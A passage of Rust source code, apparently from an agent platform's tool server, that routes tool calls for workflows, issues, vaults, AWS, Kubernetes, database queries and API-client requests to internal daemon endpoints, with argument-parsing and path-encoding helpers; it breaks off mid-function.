/// viewer POST — no tool here mutates.
fn read_route(name: &str, args: &Value, ws: Option<&str>) -> Result<ReadCall, String> {
    let ws_req = || {
        ws.filter(|s| !s.is_empty())
            .ok_or_else(|| "no workspace context (OTTO_WORKSPACE_ID unset)".to_string())
    };
    Ok(match name {
        "otto_list_workflow_runs" => ReadCall::get(format!(
            "/workflows/{}/runs?summary={}",
            seg(&arg_str(args, "workflow_id")?),
            args.get("summary").and_then(Value::as_bool).unwrap_or(true)
        )),
        "otto_get_workflow_run" => {
            ReadCall::get(format!("/workflow-runs/{}", seg(&arg_str(args, "run_id")?)))
        }
        "otto_list_broker_topics" => ReadCall::get(format!(
            "/brokers/clusters/{}/topics",
            seg(&arg_str(args, "cluster_id")?)
        )),
        "otto_search_issues" => {
            let acc = arg_str(args, "account_id")?;
            let mut path = format!("/issue/search?account_id={}", seg(&acc));
            if let Some(q) = args.get("query").and_then(Value::as_str) {
                path.push_str(&format!("&q={}", seg(q)));
            }
            if let Some(p) = args
                .get("project")
                .and_then(Value::as_str)
                .filter(|s| !s.is_empty())
            {
                path.push_str(&format!("&project={}", seg(p)));
            }
            path.push_str(&opt_query(args, &[("start_at", "start_at")]));
            ReadCall::get(path)
        }
        "otto_list_issue_transitions" => ReadCall::get(format!(
            "/issue/{}/{}/transitions",
            seg(&arg_str(args, "account_id")?),
            seg(&arg_str(args, "key")?)
        )),
        "swarm_list_projects" => ReadCall::get(format!(
            "/swarm/swarms/{}/projects",
            seg(&arg_str(args, "swarm_id")?)
        )),
        "swarm_list_tasks" => ReadCall::get(format!(
            "/swarm/projects/{}/tasks",
            seg(&arg_str(args, "project_id")?)
        )),
        "swarm_utilization" => ReadCall::get(format!(
            "/swarm/swarms/{}/utilization",
            seg(&arg_str(args, "swarm_id")?)
        )),
        "otto_search_memory" => {
            // `k` defaults to 0 server-side (MemoryQuery) → no hits; supply a useful default.
            let k = args.get("k").and_then(u64_lenient).unwrap_or(20);
            let body = json!({ "text": arg_str(args, "query")?, "k": k });
            ReadCall::post(
                format!("/workspaces/{}/memory/search", seg(ws_req()?)),
                body,
            )
        }
        // Every workspace the caller can read, this session's first (the
        // daemon also infers "current" from the session token); an explicit
        // `workspace_id` narrows it.
        "otto_list_repos" => {
            let mut q = opt_query(args, &[("workspace_id", "workspace_id")]);
            if let Some(ws) = ws.filter(|s| !s.is_empty()) {
                q.push_str(&format!("&prefer_workspace_id={}", seg(ws)));
            }
            let q = q.trim_start_matches('&');
            ReadCall::get(if q.is_empty() {
                "/git/repos/directory".to_string()
            } else {
                format!("/git/repos/directory?{q}")
            })
        }
        "otto_list_sessions" => ReadCall::get(format!("/workspaces/{}/sessions", seg(ws_req()?))),
        "otto_get_session" => {
            ReadCall::get(format!("/sessions/{}", seg(&arg_str(args, "session_id")?)))
        }
        "otto_wait_session" => ReadCall::get(format!(
            "/sessions/{}/wait?{}",
            seg(&arg_str(args, "session_id")?),
            opt_query(
                args,
                &[("status", "status"), ("timeout_secs", "timeout_secs")]
            )
            .trim_start_matches('&')
        )),
        "otto_list_findings" => ReadCall::get(format!(
            "/reviews/{}/findings",
            seg(&arg_str(args, "review_id")?)
        )),
        "otto_list_prs" => {
            let q = opt_query(
                args,
                &[
                    ("state", "state"),
                    ("page", "page"),
                    ("per_page", "per_page"),
                ],
            );
            let q = q.trim_start_matches('&');
            let repo = seg(&arg_str(args, "repo_id")?);
            ReadCall::get(if q.is_empty() {
                format!("/repos/{repo}/prs")
            } else {
                format!("/repos/{repo}/prs?{q}")
            })
        }
        "otto_get_pr" => ReadCall::get(format!(
            "/repos/{}/prs/{}",
            seg(&arg_str(args, "repo_id")?),
            arg_u64(args, "pr_number")?
        )),
        "otto_usage_summary" => {
            let q = opt_query(args, &[("days", "days"), ("otto_only", "otto_only")]);
            let q = q.trim_start_matches('&');
            ReadCall::get(if q.is_empty() {
                "/usage/summary".to_string()
            } else {
                format!("/usage/summary?{q}")
            })
        }
        "otto_list_improvement_runs" => {
            ReadCall::get(format!("/workspaces/{}/improvement/runs", seg(ws_req()?)))
        }
        "otto_list_improvement_edits" => ReadCall::get(format!(
            "/workspaces/{}/improvement/edits{}",
            seg(ws_req()?),
            opt_query(args, &[("status", "status")]).replacen('&', "?", 1)
        )),
        "otto_vault_list" => ReadCall::get(format!("/workspaces/{}/vault/vaults", seg(ws_req()?))),
        "otto_vault_dir" => {
            let v = arg_i64(args, "vault_id")?;
            let path = args.get("path").and_then(Value::as_str).unwrap_or("");
            ReadCall::get(format!(
                "/workspaces/{}/vault/vaults/{v}/dir?path={}",
                seg(ws_req()?),
                seg(path)
            ))
        }
        "otto_vault_read" => {
            let v = arg_i64(args, "vault_id")?;
            ReadCall::get(format!(
                "/workspaces/{}/vault/vaults/{v}/note?path={}",
                seg(ws_req()?),
                seg(&arg_str(args, "path")?)
            ))
        }
        "otto_vault_search" => {
            let v = arg_i64(args, "vault_id")?;
            let limit = args.get("limit").and_then(u64_lenient).unwrap_or(20);
            let body = json!({ "query": arg_str(args, "query")?, "limit": limit });
            ReadCall::post(
                format!("/workspaces/{}/vault/vaults/{v}/search", seg(ws_req()?)),
                body,
            )
        }
        "otto_vault_backlinks" => {
            let v = arg_i64(args, "vault_id")?;
            ReadCall::get(format!(
                "/workspaces/{}/vault/vaults/{v}/backlinks?path={}",
                seg(ws_req()?),
                seg(&arg_str(args, "path")?)
            ))
        }
        "otto_vault_tags" => {
            let v = arg_i64(args, "vault_id")?;
            ReadCall::get(format!(
                "/workspaces/{}/vault/vaults/{v}/tags",
                seg(ws_req()?)
            ))
        }
        "otto_vault_graph" => {
            let v = arg_i64(args, "vault_id")?;
            let mut path = format!("/workspaces/{}/vault/vaults/{v}/graph", seg(ws_req()?));
            let focus = args
                .get("path")
                .and_then(Value::as_str)
                .filter(|s| !s.is_empty());
            let mode = args
                .get("mode")
                .and_then(Value::as_str)
                .filter(|s| !s.is_empty())
                .unwrap_or(if focus.is_some() { "local" } else { "full" });
            path.push_str(&format!("?mode={}", seg(mode)));
            if let Some(f) = focus {
                path.push_str(&format!("&path={}", seg(f)));
            }
            if let Some(d) = args.get("depth").and_then(u64_lenient) {
                path.push_str(&format!("&depth={d}"));
            }
            ReadCall::get(path)
        }
        "otto_vault_okf_validate" => {
            let v = arg_i64(args, "vault_id")?;
            ReadCall::post(
                format!(
                    "/workspaces/{}/vault/vaults/{v}/okf/validate",
                    seg(ws_req()?)
                ),
                json!({}),
            )
        }
        // ---- AWS console (docs/design/aws-k8s-consoles.md §2). Accounts are
        // global rows (not workspace-scoped), so no `ws` here; `?region=` is the
        // per-call override every service route accepts (§1 "Auth injection").
        "aws_list_accounts" => ReadCall::get("/aws/accounts".to_string()),
        "aws_s3_list_buckets" => ReadCall::get(format!(
            "/aws/accounts/{}/s3/buckets?{}",
            seg(&arg_str(args, "account_id")?),
            opt_query(args, &[("region", "region")]).trim_start_matches('&')
        )),
        "aws_s3_list_objects" => ReadCall::get(format!(
            "/aws/accounts/{}/s3/buckets/{}/objects?{}",
            seg(&arg_str(args, "account_id")?),
            seg(&arg_str(args, "bucket")?),
            opt_query(
                args,
                &[
                    ("prefix", "prefix"),
                    ("token", "token"),
                    ("max", "max"),
                    ("region", "region")
                ]
            )
            .trim_start_matches('&')
        )),
        "aws_s3_preview" => ReadCall::get(format!(
            "/aws/accounts/{}/s3/buckets/{}/preview?key={}{}",
            seg(&arg_str(args, "account_id")?),
            seg(&arg_str(args, "bucket")?),
            seg(&arg_str(args, "key")?),
            opt_query(args, &[("max_bytes", "max_bytes"), ("region", "region")])
        )),
        "aws_sqs_list_queues" => ReadCall::get(format!(
            "/aws/accounts/{}/sqs/queues?{}",
            seg(&arg_str(args, "account_id")?),
            opt_query(args, &[("prefix", "prefix"), ("region", "region")]).trim_start_matches('&')
        )),
        "aws_sqs_peek" => {
            // Read-only POST: `receive-message --visibility-timeout 0` — nothing
            // is consumed or deleted (the policy table grades `/peek` as View).
            let mut body = json!({ "url": arg_str(args, "url")?, "visibility_timeout": 0 });
            if let Some(max) = args.get("max").and_then(u64_lenient) {
                body["max"] = json!(max.clamp(1, 10));
            }
            ReadCall::post(
                format!(
                    "/aws/accounts/{}/sqs/queues/peek?{}",
                    seg(&arg_str(args, "account_id")?),
                    opt_query(args, &[("region", "region")]).trim_start_matches('&')
                ),
                body,
            )
        }
        "aws_ec2_list_instances" => ReadCall::get(format!(
            "/aws/accounts/{}/ec2/instances?{}",
            seg(&arg_str(args, "account_id")?),
            opt_query(
                args,
                &[("region", "region"), ("state", "state"), ("q", "q")]
            )
            .trim_start_matches('&')
        )),
        "aws_athena_list_tables" => ReadCall::get(format!(
            "/aws/accounts/{}/athena/tables?database={}{}",
            seg(&arg_str(args, "account_id")?),
            seg(&arg_str(args, "database")?),
            opt_query(args, &[("catalog", "catalog"), ("region", "region")])
        )),
        "aws_athena_get_query" => ReadCall::get(format!(
            "/aws/accounts/{}/athena/query/{}?{}",
            seg(&arg_str(args, "account_id")?),
            seg(&arg_str(args, "query_execution_id")?),
            opt_query(
                args,
                &[("token", "token"), ("max", "max"), ("region", "region")]
            )
            .trim_start_matches('&')
        )),
        "aws_eks_list_clusters" => ReadCall::get(format!(
            "/aws/accounts/{}/eks/clusters?{}",
            seg(&arg_str(args, "account_id")?),
            opt_query(args, &[("region", "region")]).trim_start_matches('&')
        )),
        // ---- Kubernetes console (§3). `namespace` → `ns` query param; omitted
        // ⇒ the route's all-namespaces default (`-A`).
        "k8s_list_clusters" => ReadCall::get("/k8s/clusters".to_string()),
        "k8s_get_resources" => ReadCall::get(format!(
            "/k8s/clusters/{}/resources?kind={}{}",
            seg(&arg_str(args, "cluster_id")?),
            seg(&arg_str(args, "kind")?),
            opt_query(args, &[("ns", "namespace"), ("label", "label"), ("q", "q")])
        )),
        // `ns` omitted for cluster-scoped kinds (nodes, namespaces).
        "k8s_describe" => ReadCall::get(format!(
            "/k8s/clusters/{}/resource?kind={}&name={}{}",
            seg(&arg_str(args, "cluster_id")?),
            seg(&arg_str(args, "kind")?),
            seg(&arg_str(args, "name")?),
            opt_query(args, &[("ns", "namespace")])
        )),
        "k8s_health" => ReadCall::get(format!(
            "/k8s/clusters/{}/monitor/health?{}",
            seg(&arg_str(args, "cluster_id")?),
            opt_query(args, &[("window", "window")]).trim_start_matches('&')
        )),
        "k8s_top" => ReadCall::get(format!(
            "/k8s/clusters/{}/metrics?{}",
            seg(&arg_str(args, "cluster_id")?),
            opt_query(args, &[("ns", "namespace")]).trim_start_matches('&')
        )),
        // ---- Design Hall (global library; `workspace_id` only narrows) ----
        "design_list" => {
            let q = opt_query(
                args,
                &[
                    ("workspace_id", "workspace_id"),
                    ("project_id", "project_id"),
                    ("studio", "studio"),
                    ("format", "format"),
                    ("status", "status"),
                    ("story_id", "story_id"),
                    ("limit", "limit"),
                    ("cursor", "cursor"),
                ],
            );
            let q = q.trim_start_matches('&');
            ReadCall::get(if q.is_empty() {
                "/design/artifacts".to_string()
            } else {
                format!("/design/artifacts?{q}")
            })
        }
        "design_get" => {
            let content = args
                .get("include_content")
                .and_then(Value::as_bool)
                .unwrap_or(true);
            ReadCall::get(format!(
                "/design/artifacts/{}?content={content}{}",
                seg(&arg_str(args, "artifact_id")?),
                opt_query(args, &[("version", "version")])
            ))
        }
        "design_links" => ReadCall::get(format!(
            "/design/artifacts/{}/links?dir={}",
            seg(&arg_str(args, "artifact_id")?),
            seg(args
                .get("dir")
                .and_then(Value::as_str)
                .filter(|s| !s.is_empty())
                .unwrap_or("both"))
        )),
        "design_search" => ReadCall::get(format!(
            "/design/search?q={}{}",
            seg(&arg_str(args, "query")?),
            opt_query(
                args,
                &[
                    ("workspace_id", "workspace_id"),
                    ("studio", "studio"),
                    ("format", "format"),
                    ("status", "status"),
                    ("story_id", "story_id"),
                    ("project_id", "project_id"),
                    ("limit", "limit"),
                ],
            )
        )),
        other => return Err(format!("unknown feature read tool `{other}`")),
    })
}

/// The `/api/v1`-relative pod-logs path for `k8s_logs` (text/plain route).
/// Pure, like [`read_route`], so the binding is unit-tested. `follow` is never
/// forwarded — a streaming response would hang the tool call.
fn k8s_logs_path(args: &Value) -> Result<String, String> {
    Ok(format!(
        "/k8s/clusters/{}/pods/{}/{}/logs?{}",
        seg(&arg_str(args, "cluster_id")?),
        seg(&arg_str(args, "namespace")?),
        seg(&arg_str(args, "pod")?),
        opt_query(
            args,
            &[
                ("container", "container"),
                ("tail", "tail"),
                ("since", "since"),
                ("previous", "previous"),
                ("timestamps", "timestamps"),
            ]
        )
        .trim_start_matches('&')
    ))
}

/// Extract a required string argument, erroring with a clear message if absent.
fn arg_str(args: &Value, key: &str) -> Result<String, String> {
    args.get(key)
        .and_then(|v| v.as_str())
        .map(str::to_owned)
        .filter(|s| !s.is_empty())
        .ok_or_else(|| format!("missing required string argument `{key}`"))
}

/// Required unsigned integer. Accepts a JSON number or a numeric string — some
/// MCP clients stringify every argument, and a PR number arriving as `"52"`
/// should not read as "missing".
fn arg_u64(args: &Value, key: &str) -> Result<u64, String> {
    match args.get(key) {
        Some(Value::Number(n)) => n
            .as_u64()
            .ok_or_else(|| format!("argument `{key}` must be a non-negative integer")),
        Some(Value::String(s)) => s
            .trim()
            .parse::<u64>()
            .map_err(|_| format!("argument `{key}` must be a non-negative integer")),
        Some(_) => Err(format!("argument `{key}` must be a number")),
        None => Err(format!("missing required integer argument `{key}`")),
    }
}

/// Required string that may be explicitly empty (valid for file content).
fn arg_string_allow_empty(args: &Value, key: &str) -> Result<String, String> {
    match args.get(key) {
        Some(Value::String(value)) => Ok(value.clone()),
        Some(_) => Err(format!("argument `{key}` must be a string")),
        None => Err(format!("missing required string argument `{key}`")),
    }
}

fn arg_optional_string(args: &Value, key: &str) -> Result<Option<String>, String> {
    match args.get(key) {
        Some(Value::String(value)) => Ok(Some(value.clone())),
        Some(_) => Err(format!("argument `{key}` must be a string")),
        None => Ok(None),
    }
}

/// Extract a required integer argument (a numeric string is accepted — some
/// MCP clients stringify every argument).
fn arg_i64(args: &Value, key: &str) -> Result<i64, String> {
    args.get(key)
        .and_then(|v| {
            v.as_i64()
                .or_else(|| v.as_str().and_then(|s| s.trim().parse().ok()))
        })
        .ok_or_else(|| format!("missing required integer argument `{key}`"))
}

/// A JSON number, or a string holding one — for optional unsigned arguments
/// (limits, sizes, delays) that a stringifying client sends as `"5"`.
fn u64_lenient(v: &Value) -> Option<u64> {
    v.as_u64()
        .or_else(|| v.as_str().and_then(|s| s.trim().parse().ok()))
}

/// Percent-encode a path segment so an id with `/` or spaces can't break out of
/// the intended route (defense-in-depth; ids are normally opaque tokens).
fn seg(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

/// Run one tool by name. Returns the capped+redacted result `Value` and the
/// audited row count, or an error string surfaced to the agent.
async fn run_tool(ctx: &Ctx, name: &str, args: &Value) -> Result<(Value, Option<i64>), String> {
    // Git tools: turn a friendly repo reference (or none → this session's
    // repo) into the canonical id before any arm builds a `/repos/{id}` path.
    let resolved;
    let args = if NATIVE_REPO_REF_TOOLS.contains(&name) {
        resolved = resolve_repo_arg(ctx, args).await?;
        &resolved
    } else {
        args
    };
    // Every other friendly reference (a connection / cluster / account /
    // vault / workflow NAME, a workspace name, an omitted sole issue account)
    // → canonical ids, via the daemon's `/refs/resolve` as the session owner.
    let refs = resolve_native_refs(ctx, name, args).await?;
    let args = refs.as_ref().unwrap_or(args);
    match name {
        // API-client reads and writes are thin wrappers over the masked,
        // workspace-scoped daemon routes. All returned values pass `finalize`.
        "otto_api_list" => {
            let base = api_base(ctx)?;
            let query = opt_query(
                args,
                &[
                    ("q", "q"),
                    ("collection_id", "collection_id"),
                    ("kind", "kind"),
                ],
            );
            let path = if query.is_empty() {
                format!("{base}/overview")
            } else {
                format!("{base}/overview?{}", query.trim_start_matches('&'))
            };
            Ok(finalize(ctx.get_json(&path).await?))
        }
        "otto_api_get_request" => {
            let base = api_base(ctx)?;
            let request_id = if let Some(id) =
                arg_optional_string(args, "request_id")?.filter(|id| !id.is_empty())
            {
                id
            } else {
                let request_name = arg_optional_string(args, "name")?
                    .filter(|name| !name.is_empty())
                    .ok_or("pass `request_id` or a unique `name`")?;
                let overview = ctx
                    .get_json(&format!(
                        "{base}/overview?kind=requests&q={}",
                        seg(&request_name)
                    ))
                    .await?;
                let requests = overview
                    .get("requests")
                    .and_then(Value::as_array)
                    .ok_or("daemon response missing requests array")?;
                pick_by_name(requests, &request_name, "request")?
                    .get("id")
                    .and_then(Value::as_str)
                    .ok_or("matched request has no id")?
                    .to_string()
            };
            let raw = ctx
                .get_json(&format!("{base}/requests/{}?shape=agent", seg(&request_id)))
                .await?;
            Ok(finalize(raw))
        }
        "otto_api_history" => {
            let base = api_base(ctx)?;
            if let Some(id) = arg_optional_string(args, "id")?.filter(|id| !id.is_empty()) {
                let raw = ctx
                    .get_json(&format!("{base}/history/{}", seg(&id)))
                    .await?;
                return Ok(finalize(raw));
            }
            let limit = if args.get("limit").is_some() {
                arg_u64(args, "limit")?.clamp(1, 100)
            } else {
                25
            };
            let mut path = format!("{base}/history?limit={limit}");
            path.push_str(&opt_query(
                args,
                &[
                    ("q", "q"),
                    ("status", "status"),
                    ("request_id", "request_id"),
                    ("source", "source"),
                ],
            ));
            Ok(finalize(ctx.get_json(&path).await?))
        }
        "otto_api_execute" => {
            let base = api_base(ctx)?;
            if let Some(vars) = args.get("vars") {
                check_override_vars(vars)?;
            }
            let request_id = if let Some(id) =
                arg_optional_string(args, "request_id")?.filter(|id| !id.is_empty())
            {
                id
            } else {
                let request_name = arg_optional_string(args, "name")?
                    .filter(|name| !name.is_empty())
                    .ok_or("pass `request_id` or a unique `name`")?;
                let overview = ctx
                    .get_json(&format!(
                        "{base}/overview?kind=requests&q={}",
                        seg(&request_name)
                    ))
                    .await?;
                let requests = overview
                    .get("requests")
                    .and_then(Value::as_array)
                    .ok_or("daemon response missing requests array")?;
                pick_by_name(requests, &request_name, "request")?
                    .get("id")
                    .and_then(Value::as_str)
                    .ok_or("matched request has no id")?
                    .to_string()
            };

            let mut body = json!({ "shape": "agent" });
            if let Some(environment) = arg_optional_string(args, "environment")?
                .filter(|environment| !environment.is_empty())
            {
                let environments = ctx.get_json(&format!("{base}/environments")).await?;
                let environments = environments
                    .as_array()
                    .ok_or("daemon response missing environments array")?;
                let environment_id = if let Some(found) = environments.iter().find(|item| {
                    item.get("id").and_then(Value::as_str) == Some(environment.as_str())
                }) {
                    found
                        .get("id")
                        .and_then(Value::as_str)
                        .ok_or("matched environment has no id")?
                        .to_string()
                } else {
                    let overview = ctx
                        .get_json(&format!(
                            "{base}/overview?kind=environments&q={}",
                            seg(&environment)
                        ))
                        .await?;
                    let environments = overview
                        .get("environments")
                        .and_then(Value::as_array)
                        .ok_or("daemon response missing environments array")?;
                    pick_by_name(environments, &environment, "environment")?
                        .get("id")
                        .and_then(Value::as_str)
                        .ok_or("matched environment has no id")?
                        .to_string()
                };
                body["environment_id"] = json!(environment_id);
            }
            for key in [
                "vars",
                "timeout_ms",
                "confirm",
                "confirm_new_host",
                "decode_jwt",
            ] {
                if let Some(value) = args.get(key) {
                    body[key] = value.clone();
                }
            }
            // The request itself may wait up to its `timeout_ms` (≤ 60 s).
            let budget_ms = args
                .get("timeout_ms")
                .and_then(u64_lenient)
                .unwrap_or(30_000)
                .min(60_000);
            let raw = ctx
                .post_json_within(
                    &format!("{base}/requests/{}/execute", seg(&request_id)),
                    &body,
                    Duration::from_millis(budget_ms) + Duration::from_secs(15),
                )
                .await?;
            Ok(finalize(raw))
        }
        "otto_api_upsert_request" => {
            let base = api_base(ctx)?;
            let update_id = arg_optional_string(args, "request_id")?.filter(|id| !id.is_empty());
            // Update: the stored row (raw, as the owner — only ever sent back
            // in the PATCH, never to the agent) supplies every omitted field.
            let stored = match &update_id {
                Some(id) => Some(
                    ctx.get_json(&format!("{base}/requests/{}", seg(id)))
                        .await?,
                ),
                None => {
                    arg_str(args, "name")?;
                    None
                }
            };
            let parsed_curl =
                match arg_optional_string(args, "curl")?.filter(|curl| !curl.is_empty()) {
                    Some(curl) => Some(
                        ctx.post_json("/api-client/import-curl", &json!({ "curl": curl }))
                            .await?,
                    ),
                    None => None,
                };

            let mut effective_args = args.clone();
            if args.get("collection_id").is_none() {
                if let Some(collection_name) =
                    arg_optional_string(args, "collection_name")?.filter(|name| !name.is_empty())
                {
                    let overview = ctx
                        .get_json(&format!(
                            "{base}/overview?kind=requests&q={}",
                            seg(&collection_name)
                        ))
                        .await?;
                    let collections = overview
                        .get("collections")
                        .and_then(Value::as_array)
                        .ok_or("daemon response missing collections array")?;
                    let collection_id =
                        match pick_by_name(collections, &collection_name, "collection") {
                            Ok(collection) => collection
                                .get("id")
                                .and_then(Value::as_str)
                                .ok_or("matched collection has no id")?
                                .to_string(),
                            Err(error)
                                if error == format!("no collection named '{collection_name}'") =>
                            {
                                let collection = ctx
                                    .post_json(
                                        &format!("{base}/collections"),
                                        &json!({ "name": collection_name }),
                                    )
                                    .await?;
                                collection
                                    .get("id")
                                    .and_then(Value::as_str)
                                    .ok_or("created collection has no id")?
                                    .to_string()
                            }
                            Err(error) => return Err(error),
                        };
                    effective_args["collection_id"] = json!(collection_id);
                }
            }
            let body = merge_upsert(&effective_args, parsed_curl.as_ref(), stored.as_ref());
            let saved = if let Some(request_id) = update_id {
                ctx.patch_json(&format!("{base}/requests/{}", seg(&request_id)), &body)
                    .await?
            } else {
                ctx.post_json(&format!("{base}/requests"), &body).await?
            };
            let request_id = saved
                .get("id")
                .and_then(Value::as_str)
                .ok_or("saved request has no id")?;
            let raw = ctx
                .get_json(&format!("{base}/requests/{}?shape=agent", seg(request_id)))
                .await?;
            Ok(finalize(raw))
        }
        "otto_api_run_automation" => {
            let base = api_base(ctx)?;
            let automation_id = if let Some(id) =
                arg_optional_string(args, "automation_id")?.filter(|id| !id.is_empty())
            {
                id
            } else {
                let automation_name = arg_optional_string(args, "name")?
                    .filter(|name| !name.is_empty())
                    .ok_or("pass `automation_id` or a unique `name`")?;
                let overview = ctx
                    .get_json(&format!(
                        "{base}/overview?kind=automations&q={}",
                        seg(&automation_name)
                    ))
                    .await?;
                let automations = overview
                    .get("automations")
                    .and_then(Value::as_array)
                    .ok_or("daemon response missing automations array")?;
                pick_by_name(automations, &automation_name, "automation")?
                    .get("id")
                    .and_then(Value::as_str)
                    .ok_or("matched automation has no id")?
                    .to_string()
            };
            let raw = ctx
                .post_json_within(
                    &format!("{base}/automations/{}/run", seg(&automation_id)),
                    &json!({}),
                    Duration::from_secs(180),
                )
                .await?;
            Ok(finalize(raw))
        }
        // Otto Assistant tools: forward the arguments plus this session's id;
        // the daemon resolves the session to its thread (the token's own
        // session binding wins) and refuses non-assistant sessions.
        name if assistant_segment(name).is_some() => {
            let seg_name = assistant_segment(name).unwrap_or_default();
            let mut body = if args.is_object() { args.clone() } else { json!({}) };
            if let Some(sid) = ctx.session_id.clone() {
                body["session_id"] = json!(sid);
            }
            let raw = ctx
                .post_json(&format!("/assistant/agent/{seg_name}"), &body)
                .await?;
            Ok(finalize(raw))
        }
        // Personal-agent room tools: the calling session's id (from the spawn
        // env, set by the daemon) is injected so the server can resolve which
        // personal agent is speaking via the session's `meta.personal_agent`
        // and enforce room membership. A session-less caller posts as the user.
        "otto_room_post" => {
            let room = arg_str(args, "room_id")?;
            let text = arg_str(args, "text")?;
            let mut body = json!({ "text": text });
            if let Some(sid) = ctx.session_id.clone() {
                body["session_id"] = json!(sid);
            }
            let raw = ctx
                .post_json(&format!("/agent-rooms/{}/messages", seg(&room)), &body)
                .await?;
            Ok(finalize(json!({ "message": raw })))
        }
        "otto_room_read" => {
            let room = arg_str(args, "room_id")?;
            let mut q = String::new();
            if let Some(after) = args
                .get("after")
                .and_then(Value::as_str)
                .filter(|s| !s.is_empty())
            {
                q.push_str(&format!("&after={}", seg(after)));
            }
            if let Some(limit) = args.get("limit").and_then(Value::as_i64) {
                q.push_str(&format!("&limit={limit}"));
            }
            if let Some(sid) = ctx.session_id.clone() {
                q.push_str(&format!("&session_id={}", seg(&sid)));
            }
            let raw = ctx
                .get_json(&format!(
                    "/agent-rooms/{}/messages?{}",
                    seg(&room),
                    q.trim_start_matches('&')
                ))
                .await?;
            Ok(finalize(json!({ "messages": raw })))
        }
        "otto_list_connections" => {
            // Every workspace the owner can read (a connection is registered
            // in ONE workspace, not necessarily this session's), this
            // session's first — the daemon's cross-workspace directory.
            let raw = ctx
                .get_json(&directory_path(
                    "connection",
                    args,
                    ctx.workspace_id.as_deref(),
                ))
                .await?;
            // Keep only queryable DB kinds, optionally one kind, and slim each row
            // so the agent sees ids/names/kinds without connection params/secrets.
            let kind_filter = args.get("kind").and_then(Value::as_str);
            let items: Vec<Value> = raw["items"]
                .as_array()
                .map(Vec::as_slice)
                .unwrap_or(&[])
                .iter()
                .filter_map(|c| {
                    let kind = c.get("kind").and_then(Value::as_str).unwrap_or("");
                    if !matches!(
                        kind,
                        "mysql" | "postgres" | "redis" | "mongodb" | "clickhouse"
                    ) {
                        return None;
                    }
                    if kind_filter.is_some_and(|kf| kf != kind) {
                        return None;
                    }
                    Some(json!({
                        "id": c.get("id").cloned().unwrap_or(Value::Null),
                        "name": c.get("name").cloned().unwrap_or(Value::Null),
                        "kind": kind,
                        "environment": c.get("environment").cloned().unwrap_or(Value::Null),
                        "read_only": c.get("read_only").cloned().unwrap_or(Value::Null),
                        "workspace_id": c.get("workspace_id").cloned().unwrap_or(Value::Null),
                        "workspace_name": c.get("workspace_name").cloned().unwrap_or(Value::Null),
                    }))
                })
                .collect();
            Ok(finalize(json!({ "connections": items })))
        }
        "otto_db_schema" => {
            let conn = arg_str(args, "connection_id")?;
            let raw = ctx
                .get_json(&format!("/connections/{}/db/schema", seg(&conn)))
                .await?;
            Ok(finalize(json!({ "connection_id": conn, "schema": raw })))
        }
        "otto_db_children" => {
            let conn = arg_str(args, "connection_id")?;
            let path = arg_str(args, "path")?;
            let mut body = json!({ "path": path });
            if let Some(f) = args
                .get("filter")
                .and_then(Value::as_str)
                .filter(|s| !s.is_empty())
            {
                body["filter"] = json!(f);
            }
            let raw = ctx
                .post_json(
                    &format!("/connections/{}/db/schema/children", seg(&conn)),
                    &body,
                )
                .await?;
            Ok(finalize(
                json!({ "connection_id": conn, "path": path, "children": raw }),
            ))
        }
        "otto_db_object" => {
            let conn = arg_str(args, "connection_id")?;
            let path = arg_str(args, "path")?;
            let body = json!({ "path": path });
            let raw = ctx
                .post_json(&format!("/connections/{}/db/object", seg(&conn)), &body)
                .await?;
            Ok(finalize(
                json!({ "connection_id": conn, "path": path, "object": raw }),
            ))
        }
        "otto_db_query" => {
            let conn = arg_str(args, "connection_id")?;
            let statement = arg_str(args, "statement")?;
            let mut body = json!({ "statement": statement });
            // `node` (raw) wins over `database`. The active-DB `node` is a PLAIN
            // name for SQL/Mongo (e.g. "shopdb" → `USE shopdb`); Redis selects a
            // keyspace via a raw `node` like "kdb:0".
            if let Some(node) = args
                .get("node")
                .and_then(Value::as_str)
                .filter(|s| !s.is_empty())
            {
                body["node"] = json!(node);
            } else if let Some(db) = args
                .get("database")
                .and_then(Value::as_str)
                .filter(|s| !s.is_empty())
            {
                body["node"] = json!(db);
            }
            if let Some(mr) = args.get("max_rows").and_then(u64_lenient) {
                body["max_rows"] = json!(mr);
            }
            // POSTs to the read-only-enforced endpoint: any write/DDL is refused
            // server-side (see otto-dbviewer `run_read_only`) before a driver runs.
            let raw = ctx
                .post_json(&format!("/connections/{}/db/mcp-query", seg(&conn)), &body)
                .await?;
            Ok(finalize(json!({ "connection_id": conn, "result": raw })))
        }
        "otto_git_pr_review" => {
            let repo = arg_str(args, "repo_id")?;
            let number = arg_i64(args, "pr_number")?;
            // The PR record and its reviews are two read endpoints; bundle them.
            let pr = ctx
                .get_json(&format!("/repos/{}/prs/{}", seg(&repo), number))
                .await?;
            // Reviews are best-effort: a repo/provider without review data should
            // still return the PR. A failure here yields an empty review list.
            let reviews = ctx
                .get_json(&format!("/repos/{}/prs/{}/reviews", seg(&repo), number))
                .await
                .unwrap_or(Value::Array(vec![]));
            Ok(finalize(json!({
                "repo_id": repo,
                "pr_number": number,
                "pull_request": pr,
                "reviews": reviews,
            })))
        }
        "otto_product_story" => {
            let story = arg_str(args, "story_id")?;
            let story_rec = ctx
                .get_json(&format!("/product/stories/{}", seg(&story)))
                .await?;
            // The agent-ready inject bundle is optional context; tolerate absence.
            let inject = ctx
                .get_json(&format!("/product/stories/{}/inject", seg(&story)))
                .await
                .unwrap_or(Value::Null);
            Ok(finalize(json!({
                "story_id": story,
                "story": story_rec,
                "inject": inject,
            })))
        }
        "canvas_list_scenes" => {
            let ws = match arg_optional_string(args, "workspace_id")?.filter(|s| !s.is_empty()) {
                Some(ws) => ws,
                None => ctx
                    .workspace_id
                    .clone()
                    .ok_or("no workspace context (OTTO_WORKSPACE_ID unset); pass `workspace_id`")?,
            };
            let scenes = ctx
                .get_json(&format!("/workspaces/{}/canvas/scenes", seg(&ws)))
                .await?;
            Ok(finalize(json!({ "workspace_id": ws, "scenes": scenes })))
        }
        "canvas_get_scene" => {
            let scene = arg_str(args, "scene_id")?;
            let raw = ctx
                .get_json(&format!("/canvas/scenes/{}", seg(&scene)))
                .await?;
            Ok(finalize(json!({ "scene_id": scene, "scene": raw })))
        }
        "canvas_create_scene" => {
            let Some(ws) = ctx.workspace_id.clone() else {
                return Err(
